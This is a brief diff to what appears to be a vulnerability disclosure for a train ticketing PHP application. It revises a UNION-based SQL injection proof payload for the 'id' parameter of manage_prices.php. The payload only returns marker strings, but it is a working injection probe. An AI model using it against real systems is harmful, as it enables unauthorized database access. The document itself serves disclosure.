@@ -8,7 +8,7 @@ Vulnerability File: /train_ticketing/manage_prices.php
 
 GET parameter 'id' exists SQL injection vulnerability
 
-Payload1: id=1 union all select concat(0x616263,0x7576777879),null,null-- -
+Payload1: id=1 union all select null,concat(0x616263,0x7576777879),null-- -
 
 The union query is successful, which proves that there is SQL injection.
 
